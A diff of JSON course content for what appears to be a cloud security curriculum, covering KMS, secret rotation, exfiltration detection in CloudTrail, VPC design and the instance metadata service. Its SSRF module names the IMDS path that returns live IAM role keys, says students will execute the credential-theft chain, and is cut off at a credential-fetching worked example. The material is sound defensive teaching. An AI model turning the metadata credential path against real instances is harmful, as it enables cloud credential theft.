+            "body": "Keyless removes the stored-key risk but introduces a new critical control: the trust policy / federation condition. Get it too loose and you've built a different hole.\n\nThe classic mistakes: an OIDC trust policy with no `sub` condition (any repo can assume the role), a wildcard `repo:acme/*` that includes forks or abandoned repos, or accepting the wrong `aud`. For IRSA, forgetting the service-account condition lets any pod in the cluster assume the role. Review federation trust policies as carefully as you'd review a secret's access — they ARE the access control now."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Leaked long-lived keys are the number-one root cause in cloud incident reports. Workload identity federation 'kills the problem at the root' — there is simply no durable credential to steal from code, CI, or an image.\n\nThe migration is concrete and achievable: the 'Go Keyless with OIDC' lab replaces a stored AWS access key in a GitHub Actions pipeline with OIDC federation, so after the change no long-lived AWS credential exists anywhere in the repo or CI secrets.\n\nThe residual risk shifts from 'protect the key' to 'write a tight trust policy' and 'protect the metadata endpoint' (module cloud-m7) — a much smaller, more auditable surface."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m6-5",
+        "moduleId": "cloud-m6",
+        "number": 38,
+        "title": "KMS & Envelope Encryption",
+        "type": "theory",
+        "week": 2,
+        "description": "The key-management service that underpins every encrypted secret. Students learn envelope encryption and how KMS key policies, not the encryption itself, are the real access control.",
+        "keyPoints": [
+          "Envelope encryption: data keys wrapped by a KMS customer master key",
+          "KMS key policy + grants decide who can Encrypt/Decrypt/GenerateDataKey",
+          "Customer-managed CMK vs AWS-managed keys and rotation settings",
+          "KMS as a cross-account decrypt gatekeeper (both IAM and key policy must allow)",
+          "CloudTrail visibility into every Decrypt call for abuse detection"
+        ],
+        "slides": [
+          {
+            "title": "What KMS and Envelope Encryption Are",
+            "body": "KMS (Key Management Service) is the service under every encrypted secret, S3 object, EBS volume and RDS database in AWS. It manages cryptographic keys and, crucially, controls *who can use them*.\n\nEnvelope encryption is the pattern it uses. Analogy: you lock your document in a small box with a cheap padlock (the data key). You then lock that padlock's key inside a bank vault (the KMS master key). The locked box travels freely; it's useless without a trip to the vault to retrieve the padlock key. The box = encrypted data, the padlock key = data key, the vault = KMS.\n\nWhy two layers? Because encrypting gigabytes directly with a master key you never expose is impractical — so you encrypt data with a fast local data key, and only the tiny data key goes to KMS to be wrapped."
+          },
+          {
+            "title": "How Envelope Encryption Works",
+            "body": "To encrypt: call KMS GenerateDataKey. KMS returns the data key twice — once in plaintext (use it to encrypt your data locally, then throw it away) and once encrypted under the master key (store this alongside the ciphertext). To decrypt: send the encrypted data key back to KMS Decrypt, get the plaintext data key, decrypt your data locally.\n\nThe master key (CMK) *never leaves KMS*. Only data keys travel, and the stored one is always wrapped. This is exactly what Secrets Manager does under the hood for every secret.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "GenerateDataKey",
+                  "detail": "KMS returns plaintext + encrypted data key"
+                },
+                {
+                  "label": "Encrypt data locally",
+                  "detail": "use plaintext data key, then discard it"
+                },
+                {
+                  "label": "Store ciphertext + wrapped key",
+                  "detail": "both saved together; master key stays in KMS"
+                },
+                {
+                  "label": "Decrypt later",
+                  "detail": "send wrapped key to KMS, get plaintext key back"
+                }
+              ]
+            }
+          },
+          {
+            "title": "The Real Access Control Is the Key Policy",
+            "body": "Here is the insight that trips people up: the encryption math is unbreakable, so it is NOT what protects your data. What protects it is *who KMS lets call Decrypt/Encrypt/GenerateDataKey*. That is decided by the KMS **key policy** (plus grants and IAM).\n\nIf a key policy allows `kms:Decrypt` to a broad principal, the strongest AES-256 encryption is irrelevant — the attacker just asks KMS to decrypt for them. Reviewing KMS access means reading key policies, not checking cipher strength.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "What does NOT protect the data",
+                  "points": [
+                    "Cipher strength (AES-256 is fine)",
+                    "The algorithm choice",
+                    "The fact it's 'encrypted at rest'"
+                  ]
+                },
+                {
+                  "label": "What DOES protect the data",
+                  "points": [
+                    "KMS key policy: who can Decrypt",
+                    "Grants scoping temporary use",
+                    "IAM policies on the caller",
+                    "Condition keys (e.g. ViaService)"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            },
+            "check": {
+              "question": "A secret is encrypted with AES-256 via a KMS key, but the key policy allows kms:Decrypt to \"AWS\": \"*\". What is the security posture?",
+              "options": [
+                "Secure — AES-256 cannot be broken",
+                "Insecure — anyone KMS accepts can ask it to decrypt, so the broad key policy, not the cipher, is the exposure",
+                "Secure — the data key is thrown away after use",
+                "Insecure only if the algorithm is weak"
+              ],
+              "correctIndex": 1,
+              "explanation": "Encryption strength is irrelevant when the key policy hands out Decrypt broadly. The attacker never breaks the cipher — they call KMS, which decrypts for them because the policy allows it. The KMS key policy is the true access control, not the algorithm."
+            }
+          },
+          {
+            "title": "Worked Example: Decrypting via KMS",
+            "body": "You rarely call KMS by hand — Secrets Manager and S3 do it for you — but seeing it makes the model concrete. The caller hands KMS a wrapped (encrypted) data key or small ciphertext and gets plaintext back, only because their identity passes the key policy.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws kms decrypt --ciphertext-blob fileb://wrapped.key --key-id alias/billing-secrets --query Plaintext --output text | base64 -d",
+                  "output": "<32 bytes of plaintext data key>   # succeeds ONLY if key policy + IAM allow kms:Decrypt for this caller"
+                },
+                {
+                  "command": "aws kms decrypt --ciphertext-blob fileb://wrapped.key --key-id alias/billing-secrets",
+                  "output": "An error occurred (AccessDeniedException): principal is not authorized to perform kms:Decrypt"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Customer-Managed vs AWS-Managed Keys",
+            "body": "Two flavours of KMS key matter for security review. AWS-managed keys (aliases like `aws/secretsmanager`) are created and rotated automatically by AWS, but you cannot edit their key policy — access follows IAM only. Customer-managed keys (CMKs) you create and fully control: you write the key policy, choose rotation, and can scope who decrypts.\n\nFor anything sensitive, CMKs are preferred precisely because you can lock the key policy down and add cross-account conditions. AWS-managed keys are convenient but give you less control and no custom policy. CMK rotation (annual automatic, or on-demand) re-wraps new data keys while old ciphertext stays decryptable."
+          },
+          {
+            "title": "KMS as the Cross-Account Gatekeeper",
+            "body": "KMS is the choke point for cross-account access to encrypted data. To read another account's encrypted secret or S3 object, two things must BOTH allow you: the resource's own policy (IAM/resource policy) AND the KMS key policy. Either one denying is a hard stop.\n\nThis is a powerful containment property. Even if an S3 bucket policy is accidentally opened cross-account, a tightly scoped KMS key policy still prevents decryption. Conversely, the dangerous misconfiguration is opening *both* — a broad bucket/secret policy and a broad KMS key policy together — which is exactly the mistake that turns a minor exposure into a data breach.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "att",
+                  "label": "External account",
+                  "highlighted": true
+                },
+                {
+                  "id": "res",
+                  "label": "Resource policy (S3/secret)"
+                },
+                {
+                  "id": "kms",
+                  "label": "KMS key policy"
+                },
+                {
+                  "id": "data",
+                  "label": "Plaintext data"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "att",
+                  "to": "res",
+                  "label": "must allow"
+                },
+                {
+                  "from": "att",
+                  "to": "kms",
+                  "label": "must ALSO allow Decrypt"
+                },
+                {
+                  "from": "res",
+                  "to": "data",
+                  "label": "gets ciphertext"
+                },
+                {
+                  "from": "kms",
+                  "to": "data",
+                  "label": "unlocks only if both pass"
+                }
+              ]
+            }
+          },
+          {
+            "title": "CloudTrail Visibility into Every Decrypt",
+            "body": "KMS logs every Decrypt, Encrypt and GenerateDataKey to CloudTrail, including the caller, the key, the time, and (via encryption context) often *what* was decrypted. This is a rich detection source.\n\nAn app decrypting its own data key a few times an hour is baseline. A principal suddenly calling Decrypt against many keys, or an unusual identity touching a production CMK, is an abuse signal. Because KMS sits under secrets, S3 SSE-KMS and EBS, KMS CloudTrail events are one of the best places to catch bulk data access — feeding directly into the detection work in topic 6."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "KMS underpins every encrypted secret in the module: Secrets Manager, SSM SecureString, S3, EBS, RDS all lean on it. Understanding envelope encryption demystifies why reads need kms:Decrypt and why access is a two-lock model.\n\nThe defender's checklist: use customer-managed CMKs for sensitive data so you control the key policy; scope Decrypt to specific roles (optionally with kms:ViaService conditions); never pair a broad resource policy with a broad key policy; enable rotation; and monitor KMS CloudTrail for bulk or anomalous decrypts.\n\nThe core mental shift: the cipher is never the weak point — the key policy is. Audit policies, not algorithms."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m6-6",
+        "moduleId": "cloud-m6",
+        "number": 39,
+        "title": "Rotation & Detection",
+        "type": "exercise",
+        "week": 2,
+        "description": "Operationalising secret hygiene. Students enable rotation and build alerting on anomalous secret access.",
+        "keyPoints": [
+          "Automatic rotation with Secrets Manager + Lambda rotation functions",
+          "Blast-radius limiting: unique secret per service, never shared",
+          "Detecting mass GetSecretValue calls (exfil signal) in CloudTrail",
+          "Revocation playbook when a key is known-leaked",
+          "GitHub secret scanning / push protection as a prevention gate"
+        ],
+        "slides": [
+          {
+            "title": "What Rotation and Detection Are For",
+            "body": "The first five topics reduced where secrets live and how they're protected. This final topic is about operating that program over time: *rotation* (changing secrets regularly and automatically) and *detection* (noticing when a secret is being abused).\n\nAnalogy: even a perfect key cabinet needs two habits — re-cutting the locks on a schedule so an old copy stops working, and a guard watching the access log for someone grabbing every key at 3am. Rotation limits how long a leaked secret stays useful; detection catches the theft in progress.\n\nThese are the exercise and incident-response skills that turn secret management from a one-time setup into a living defence."
+          },
+          {
+            "title": "Automatic Rotation with Secrets Manager",
+            "body": "Secrets Manager rotates a secret by invoking a *rotation Lambda* on a schedule. The Lambda runs a four-step state machine: createSecret (generate a new value as AWSPENDING), setSecret (update the target system, e.g. change the DB password), testSecret (verify the new value works), finishSecret (move the AWSCURRENT label to the new version).\n\nBecause apps always read AWSCURRENT, the swap is seamless — zero downtime. The old value becomes AWSPREVIOUS and stops being served. This is the staging-label mechanism from topic 3 put to work.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "createSecret",
+                  "detail": "new value stored as AWSPENDING"
+                },
+                {
+                  "label": "setSecret",
+                  "detail": "update the DB/service to the new value"
+                },
+                {
+                  "label": "testSecret",
+                  "detail": "verify new credential actually works"
+                },
+                {
+                  "label": "finishSecret",
+                  "detail": "move AWSCURRENT label; old = AWSPREVIOUS"
+                }
+              ]
+            },
+            "check": {
+              "question": "During Secrets Manager rotation, why do applications experience zero downtime?",
+              "options": [
+                "The app is paused while the secret rotates",
+                "Apps always request AWSCURRENT; rotation prepares the new value as AWSPENDING and only moves the AWSCURRENT label after the new value is tested and working",
+                "Both old and new passwords work forever",
+                "Rotation only runs when no apps are connected"
+              ],
+              "correctIndex": 1,
+              "explanation": "The rotation Lambda creates AWSPENDING, updates the target, tests it, THEN atomically moves the AWSCURRENT label. Apps that always fetch AWSCURRENT get the old value until the instant it's proven to work, then the new value — no window where the live secret is broken."
+            }
+          },
+          {
+            "title": "Blast-Radius Limiting: One Secret per Service",
+            "body": "Rotation limits a leak in *time*; unique secrets limit it in *space*. If ten services share one database credential, rotating it means coordinating ten deployments, so teams avoid rotating — and a single leak compromises all ten.\n\nGive each service its own secret (and ideally its own DB user with least-privilege grants). Now rotating one service's credential touches only that service, and a leak from one service cannot be replayed against the others. Small blast radius is what makes frequent rotation practically achievable.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Shared secret (bad)",
+                  "points": [
+                    "10 services, 1 credential",
+                    "Rotation = 10 coordinated deploys",
+                    "So nobody rotates",
+                    "One leak compromises all 10"
+                  ]
+                },
+                {
+                  "label": "Per-service secret (good)",
+                  "points": [
+                    "1 credential each, own DB user",
+                    "Rotate one = touch one service",
+                    "Rotation is routine",
+                    "Leak contained to one service"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Detecting Exfiltration: Mass GetSecretValue",
+            "body": "A normal service reads its own one or two secrets occasionally. An attacker who lands a role tends to *sweep* — calling GetSecretValue (or GetParameter, or kms:Decrypt) across many secrets in a short window to grab everything before being cut off.\n\nThat burst is the signal. You query CloudTrail for a single principal reading an unusual number of distinct secrets in a short time, or any principal reading secrets it has never touched before. This is a high-fidelity exfiltration detection and the heart of this topic's exercise.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue --start-time 2026-11-16T02:00:00Z --query 'Events[].CloudTrailEvent' | jq -r '.[]|fromjson|.userIdentity.arn' | sort | uniq -c | sort -rn",
+                  "output": "  47 arn:aws:sts::123456789012:assumed-role/web-app-role/i-0abc  <-- one role read 47 secrets at 03:14 UTC: exfil signal"
+                }
+              ]
+            }
+          },
+          {
+            "title": "The Revocation Playbook",
+            "body": "When a secret is known-leaked, speed matters more than elegance. The playbook, in order: (1) rotate/invalidate the secret immediately so the leaked value stops working; (2) revoke active sessions — for leaked AWS keys, attach a deny policy or disable the key, and for STS sessions use an AWSRevokeOlderSessions-style policy; (3) review CloudTrail for what the leaked credential already did; (4) rotate anything that credential could have reached (lateral blast radius); (5) fix the leak source so it doesn't recur.\n\nThe mistake to avoid: rotating the secret but forgetting to revoke the attacker's already-active session or the downstream secrets they may have grabbed."
+          },
+          {
+            "title": "Prevention Gate: GitHub Secret Scanning and Push Protection",
+            "body": "The cheapest detection is catching the secret *before* it's committed. GitHub secret scanning recognises known credential formats (AWS keys, Stripe keys, tokens) and *push protection* blocks the push outright when it finds one, forcing the developer to remove it.\n\nMany providers also participate in a partner program: if a known key format does slip into a public repo, GitHub notifies the provider, who can auto-revoke it. Wiring push protection (plus the gitleaks/detect-secrets pre-commit gate from topic 2) across your org closes the most common leak path at the source — far cheaper than hunting and rotating after the fact.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Developer git push",
+              "rightLabel": "GitHub push protection",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "push commit",
+                  "payload": "diff adds: AKIAIOSFODNN7EXAMPLE"
+                },
+                {
+                  "direction": "left",
+                  "label": "rejected",
+                  "payload": "push blocked: detected AWS Access Key ID.\nRemove the secret or mark as false positive to proceed."
+                }
+              ]
+            }
+          },
+          {
+            "title": "Putting It Together: a Secret-Hygiene Loop",
+            "body": "A mature program runs a continuous loop: prevent leaks at commit time (push protection), store centrally with KMS and tight policies (topics 3, 5), eliminate long-lived keys where possible (topic 4), rotate what remains on a schedule (this topic), and watch CloudTrail for abuse (this topic). When something leaks anyway, the revocation playbook executes fast and the leak source is fixed.\n\nNo single control is sufficient — push protection misses novel formats, rotation has a window, detection has latency. Layered, they make a leaked secret low-value: hard to introduce, short-lived, and loud when abused."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Secrets will leak despite best efforts — the question is how much a leak is worth to an attacker. Rotation shrinks the useful lifetime; per-service scoping shrinks the blast radius; detection shrinks the time-to-catch; the revocation playbook shrinks the time-to-contain. Together they turn a catastrophic breach into a contained, auditable incident.\n\nThis topic's exercise has you enable automatic rotation and build a CloudTrail alert on anomalous GetSecretValue volume — the operational muscle that keeps the whole module's protections honest over time. Combined with the keyless work in topic 4, the end state is: few long-lived secrets, all rotated, all monitored, and leaks caught before they're committed."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "cloud-m7",
+    "name": "Cloud Networking & SSRF-to-Metadata",
+    "shortName": "Cloud Networking & SSRF",
+    "month": 3,
+    "weeks": [
+      3
+    ],
+    "description": "Covers the cloud network model and its single most dangerous attack chain: SSRF reaching the instance metadata service to steal workload credentials — the Capital One pattern. Students learn VPC design, security groups, exposure analysis and metadata hardening (IMDSv2).",
+    "estimatedHours": 12,
+    "outcomes": [
+      "Design and read VPC architecture: subnets, route tables, gateways, security groups and NACLs",
+      "Execute the SSRF-to-metadata credential-theft chain and explain why IMDSv2 breaks it",
+      "Identify internet-exposed services and over-permissive security-group rules",
+      "Harden metadata access and segment networks to contain lateral movement"
+    ],
+    "topics": [
+      {
+        "id": "cloud-m7-1",
+        "moduleId": "cloud-m7",
+        "number": 40,
+        "title": "The VPC Model",
+        "type": "theory",
+        "week": 3,
+        "description": "The virtual network that everything runs in. Students learn the building blocks and how traffic is actually routed and filtered.",
+        "keyPoints": [
+          "VPC, subnets (public vs private), route tables, Internet/NAT gateways",
+          "Security groups (stateful, allow-only) vs NACLs (stateless, allow+deny)",
+          "VPC peering, Transit Gateway and the risk of flat, over-connected networks",
+          "VPC endpoints (Gateway & Interface/PrivateLink) to reach AWS APIs privately",
+          "Azure VNet / GCP VPC equivalents and shared concepts"
+        ],
+        "slides": [
+          {
+            "title": "What a VPC Is",
+            "body": "A Virtual Private Cloud (VPC) is your own private slice of the cloud provider's network. Think of it as renting one floor in a huge office building: the building is AWS, but your floor has its own walls, its own internal wiring, and its own locked doors. Nothing on another tenant's floor can reach yours unless you deliberately build a bridge.\n\nEverything you run in the cloud — servers (EC2 instances), databases, containers — lives inside a VPC and talks over its private network. When you create a VPC you pick an address range in CIDR notation, like 10.0.0.0/16, and every machine inside gets a private IP from that range (10.0.x.x). That range is yours alone; it never appears on the public internet."
+          },
+          {
+            "title": "The Building Blocks",
+            "body": "A VPC is divided into subnets — smaller address ranges, each pinned to one Availability Zone (a physical data center). A route table is the signpost that tells traffic leaving a subnet where to go next. An Internet Gateway (IGW) is the front door to the public internet. A NAT Gateway is a one-way valve: it lets private machines dial out to the internet (for updates) while staying unreachable from outside.\n\nSo the flow of any packet is: machine -> subnet -> route table decision -> gateway (or stays internal). Understanding this path is the whole game, because an attacker's reachability is decided by exactly these signposts and doors.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "vpc",
+                  "label": "VPC 10.0.0.0/16",
+                  "highlighted": true
+                },
+                {
+                  "id": "pub",
+                  "label": "Public subnet 10.0.1.0/24"
+                },
+                {
+                  "id": "priv",
+                  "label": "Private subnet 10.0.2.0/24"
+                },
+                {
+                  "id": "igw",
+                  "label": "Internet Gateway"
+                },
+                {
+                  "id": "nat",
+                  "label": "NAT Gateway"
+                },
+                {
+                  "id": "net",
+                  "label": "Internet"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "vpc",
+                  "to": "pub",
+                  "label": "contains"
+                },
+                {
+                  "from": "vpc",
+                  "to": "priv",
+                  "label": "contains"
+                },
+                {
+                  "from": "pub",
+                  "to": "igw",
+                  "label": "route 0.0.0.0/0"
+                },
+                {
+                  "from": "priv",
+                  "to": "nat",
+                  "label": "route 0.0.0.0/0"
+                },
+                {
+                  "from": "igw",
+                  "to": "net",
+                  "label": "two-way"
+                },
+                {
+                  "from": "nat",
+                  "to": "net",
+                  "label": "outbound only"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Public vs Private Subnets",
+            "body": "Here is the single most important fact: a subnet is not 'public' because of a setting called public. It is public only when its route table contains a route 0.0.0.0/0 -> Internet Gateway. That one line means 'anything not local, send to the internet door.'\n\nIf that same catch-all route points at a NAT Gateway instead, the subnet is private: machines can reach out, but nobody can reach in. If there is no 0.0.0.0/0 route at all, the subnet is fully isolated. When you audit a cloud network, you read route tables, not subnet names — someone may have named a subnet 'private' while its route table says otherwise.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Public subnet",
+                  "points": [
+                    "Route 0.0.0.0/0 -> Internet Gateway",
+                    "Instances can get public IPs",
+                    "Reachable from the internet (if SG allows)",
+                    "Put load balancers / bastions here"
+                  ],
+                  "highlighted": false
+                },
+                {
+                  "label": "Private subnet",
+                  "points": [
+                    "Route 0.0.0.0/0 -> NAT Gateway (or none)",
+                    "No public IP, no inbound internet path",
+                    "Outbound-only or fully isolated",
+                    "Put databases / app servers here"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Two Filters: Security Groups vs NACLs",
+            "body": "Every VPC has two independent firewalls, and you must know how they differ.\n\nA Security Group (SG) wraps each instance (its network interface). It is stateful — if you allow a request in, the reply is allowed out automatically. It is allow-only: you can write 'permit,' never 'deny.' Anything not explicitly allowed is blocked.\n\nA Network ACL (NACL) wraps the whole subnet. It is stateless — it evaluates each direction separately, so you must allow both the request and its return traffic (including ephemeral ports). It supports both allow and deny rules, processed in number order. SGs are your primary control; NACLs are a coarse backstop.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Security Group",
+                  "points": [
+                    "Attached to the instance/ENI",
+                    "Stateful: return traffic auto-allowed",
+                    "Allow rules only",
+                    "First match not needed — all rules OR'd",
+                    "Your main day-to-day control"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Network ACL",
+                  "points": [
+                    "Attached to the subnet",
+                    "Stateless: must allow both directions",
+                    "Allow AND deny rules",
+                    "Evaluated in rule-number order",
+                    "Coarse backstop / explicit blocks"
+                  ],
+                  "highlighted": false
+                }
+              ]
+            },
+            "check": {
+              "question": "You add an inbound rule to a Security Group allowing TCP 443 from 0.0.0.0/0, but write no outbound rule. Can the server send the HTTPS response back?",
+              "options": [
+                "No — you must add a matching outbound rule for the reply",
+                "Yes — Security Groups are stateful, so the reply is allowed automatically",
+                "Only if a NACL also allows the ephemeral return port"
+              ],
+              "correctIndex": 1,
+              "explanation": "Security Groups are stateful: an allowed inbound connection's return traffic is permitted automatically regardless of outbound rules. NACLs, being stateless, are the ones that would need an explicit rule for the ephemeral return port."
+            }
+          },
+          {
+            "title": "Worked Example: Reading the Network",
+            "body": "You rarely design a VPC from scratch during an assessment — you read an existing one. Two commands do most of the work: describe the route tables to learn which subnets are public, and describe the security groups to learn what is reachable. Below, the route table shows a 0.0.0.0/0 -> igw route (so its subnet is public), and the security group exposes SSH to the entire internet — an immediate finding.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws ec2 describe-route-tables --query 'RouteTables[].Routes[?GatewayId!=`local`]' --profile technieum",
+                  "output": "[[{\"DestinationCidrBlock\": \"0.0.0.0/0\", \"GatewayId\": \"igw-0a1b2c3d\"}]]   <- public subnet"
+                },
+                {
+                  "command": "aws ec2 describe-security-groups --query 'SecurityGroups[].IpPermissions[?FromPort==`22`]'",
+                  "output": "[[{\"FromPort\":22,\"ToPort\":22,\"IpRanges\":[{\"CidrIp\":\"0.0.0.0/0\"}]}]]   <- SSH open to world"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Connecting VPCs: Peering and Transit Gateway",
+            "body": "VPCs can be joined. VPC peering is a direct 1-to-1 link between two VPCs. Crucially, peering is non-transitive: if A peers with B and B peers with C, A still cannot reach C. That limit is a safety feature.\n\nA Transit Gateway (TGW) is a central hub that many VPCs connect to at once — convenient, but it can quietly create a flat network where everything reaches everything. Flat, over-connected networks are the attacker's dream: one foothold becomes account-wide reach. When reviewing, map the peering and TGW graph and ask 'what is the blast radius of one compromised host here?'",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "tgw",
+                  "label": "Transit Gateway (hub)",
+                  "highlighted": true
+                },
+                {
+                  "id": "a",
+                  "label": "Prod VPC"
+                },
+                {
+                  "id": "b",
+                  "label": "Dev VPC"
+                },
+                {
+                  "id": "c",
+                  "label": "Shared-services VPC"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "a",
+                  "to": "tgw",
+                  "label": "attached"
+                },
+                {
+                  "from": "b",
+                  "to": "tgw",
+                  "label": "attached"
+                },
+                {
+                  "from": "c",
+                  "to": "tgw",
+                  "label": "attached"
+                },
+                {
+                  "from": "tgw",
+                  "to": "a",
+                  "label": "can route to all = flat risk"
+                }
+              ]
+            }
+          },
+          {
+            "title": "VPC Endpoints: Private Doors to AWS APIs",
+            "body": "Normally, calling an AWS service like S3 goes out over the public internet. A VPC endpoint creates a private door so that traffic never leaves AWS's network. There are two kinds. A Gateway endpoint (S3 and DynamoDB only) adds a route in your route table. An Interface endpoint (PrivateLink) puts an actual private IP inside your subnet that resolves the service's DNS name.\n\nEndpoints matter for security two ways: they keep sensitive API traffic off the internet (good), and they can be a trust shortcut an attacker abuses for lateral movement (covered later). For now: see an endpoint, know that private traffic flows through it."
+          },
+          {
+            "title": "Why It Matters, and Other Clouds",
+            "body": "The VPC is the first containment boundary in the cloud. Before anyone talks about IAM or application bugs, the network decides who can even reach what. A well-segmented VPC turns a server compromise into a dead end; a flat one turns it into a breach.\n\nThe concepts carry across providers. Azure calls it a Virtual Network (VNet) with Network Security Groups and route tables. Google Cloud has a VPC with firewall rules that are global and tag-based. The names differ, but the mental model — address ranges, subnets, routes, gateways, and two layers of filtering — is the same everywhere. Learn it once and you can read any cloud's network."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m7-2",
+        "moduleId": "cloud-m7",
+        "number": 41,
+        "title": "The Instance Metadata Service",
+        "type": "theory",
+        "week": 3,
+        "description": "The link-local 169.254.169.254 service that hands credentials to workloads — and to attackers who can make the workload fetch it. The crux of the module.",
+        "keyPoints": [
+          "169.254.169.254 serves instance identity and, crucially, role credentials",
+          "IMDSv1 (simple GET) vs IMDSv2 (session token via PUT, hop-limit)",
+          "/latest/meta-data/iam/security-credentials/ returns live role keys",
+          "The returned credentials carry the instance profile's full permissions",
+          "Equivalent metadata endpoints on Azure (with Metadata header) and GCP"
+        ],
+        "slides": [
+          {
+            "title": "What the Metadata Service Is",
+            "body": "Every cloud server needs to know things about itself: its ID, its region, and — most importantly — the temporary credentials for the IAM role attached to it. The Instance Metadata Service (IMDS) is a tiny built-in web server that answers those questions, but only to requests coming from inside the instance itself.\n\nThink of it as a concierge who lives inside your hotel room. If you pick up the in-room phone and ask, the concierge hands you your car keys. That is convenient — your apps get credentials without you hard-coding any. The danger is simple: if an attacker can make something inside the room pick up that phone on their behalf, the concierge hands over the keys just the same."
+          },
+          {
+            "title": "The Magic Address 169.254.169.254",
+            "body": "IMDS always lives at the same address on every cloud instance: 169.254.169.254. This is a link-local address — a special range (169.254.0.0/16) that is only valid on the local link and is never routed across the internet. You can only reach it from on the machine itself.\n\nBecause the address is fixed and well-known, any code running on the instance that makes outbound HTTP requests can query it. There is no password and no network authentication: being on the box is the only credential. That design choice — 'local access equals trust' — is exactly what the SSRF attack in the next topic turns into a breach.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "App on instance",
+                  "detail": "needs AWS credentials"
+                },
+                {
+                  "label": "HTTP GET 169.254.169.254",
+                  "detail": "link-local, no auth"
+                },
+                {
+                  "label": "IMDS responds",
+                  "detail": "serves identity + role keys"
+                },
+                {
+                  "label": "App calls AWS",
+                  "detail": "uses the temporary keys"
+                }
+              ]
+            }
+          },
+          {
+            "title": "What It Serves — and the Dangerous Path",
+            "body": "IMDS exposes a tree of paths under /latest/meta-data/. Most are harmless: instance-id, local-hostname, placement/region. One branch is the crown jewel: /latest/meta-data/iam/security-credentials/.\n\nFetch that path and it lists the role name attached to the instance. Fetch the path plus the role name and it returns live credentials — an AccessKeyId, a SecretAccessKey, a session Token, and an expiry. These keys carry the full permissions of the instance's IAM role. If that role can read S3, so can anyone holding these keys. This is why reaching IMDS is not an information leak — it is credential theft.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "root",
+                  "label": "/latest/meta-data/"
+                },
+                {
+                  "id": "id",
+                  "label": "instance-id (harmless)"
+                },
+                {
+                  "id": "plc",
+                  "label": "placement/region (harmless)"
+                },
+                {
+                  "id": "iam",
+                  "label": "iam/security-credentials/",
+                  "highlighted": true
+                },
+                {
+                  "id": "role",
+                  "label": "<role-name> -> live keys",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "root",
+                  "to": "id",
+                  "label": ""
+                },
+                {
+                  "from": "root",
+                  "to": "plc",
+                  "label": ""
+                },
+                {
+                  "from": "root",
+                  "to": "iam",
+                  "label": "the crown jewel"
+                },
+                {
+                  "from": "iam",
+                  "to": "role",
+                  "label": "returns AccessKey+Secret+Token"
+                }
+              ]
+            }
+          },
+          {
+            "title": "IMDSv1 vs IMDSv2 — the Key Mechanism",
+            "body": "There are two versions, and the difference is the whole defense.\n\nIMDSv1 is a plain GET. One request — GET /latest/meta-data/... — returns the data. No token, no ceremony. An SSRF that can make a single GET gets everything.\n\nIMDSv2 is session-oriented. First you must do a PUT to /latest/api/token with a special header to obtain a short-lived token. Then every GET must carry that token in the X-aws-ec2-metadata-token header. It also sets a hop limit (default 1) on the response packet's TTL, so a request that was proxied through an extra network hop is dropped. Most SSRF bugs can only make simple GETs and cannot set custom headers or issue PUTs — so IMDSv2 breaks them.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "IMDSv1 (weak)",
+                  "points": [
+                    "Single GET, no token",
+                    "No custom headers needed",
+                    "Trivially reachable via SSRF",
+                    "Still the default-allowed fallback unless disabled"
+                  ],
+                  "highlighted": false
+                },
+                {
+                  "label": "IMDSv2 (hardened)",
+                  "points": [
+                    "PUT to get a session token first",
+                    "Every GET needs the token header",
+                    "Hop-limit 1 drops proxied requests",
+                    "Naive SSRF cannot do PUT + custom header"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            },
+            "check": {
+              "question": "Why does IMDSv2 defeat most basic SSRF attacks that IMDSv1 did not?",
+              "options": [
+                "It moves the metadata service to a secret IP address",
+                "It requires a PUT with a custom header to get a token, then that token on every GET — things a simple SSRF usually cannot do",
+                "It encrypts the credentials so SSRF returns ciphertext",
+                "It requires the attacker to authenticate with an IAM user first"
+              ],
+              "correctIndex": 1,
+              "explanation": "IMDSv2's defense is procedural: a PUT to obtain a session token plus a custom token header on every subsequent GET. Most SSRF primitives can only issue a plain GET with no custom headers, so they never obtain the token. The hop-limit of 1 adds a second barrier against proxied requests."
+            }
+          },
+          {
+            "title": "Worked Example: Asking for Credentials",
